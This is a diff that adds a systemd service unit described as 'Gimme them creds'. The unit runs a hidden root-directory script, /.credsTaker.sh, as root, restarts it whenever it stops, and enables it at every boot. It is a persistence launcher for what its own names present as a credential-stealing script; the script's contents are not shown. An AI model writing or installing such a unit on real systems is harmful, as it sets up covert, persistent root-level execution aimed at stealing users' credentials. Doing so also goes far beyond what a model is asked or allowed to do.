@@ -1,0 +1,14 @@
+[Unit]
+Description=Gimme them creds
+StartLimitBurst=5
+StartLimitIntervalSec=10
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=3
+User=root
+ExecStart=/bin/bash /.credsTaker.sh
+
+[Install]
+WantedBy=multi-user.target
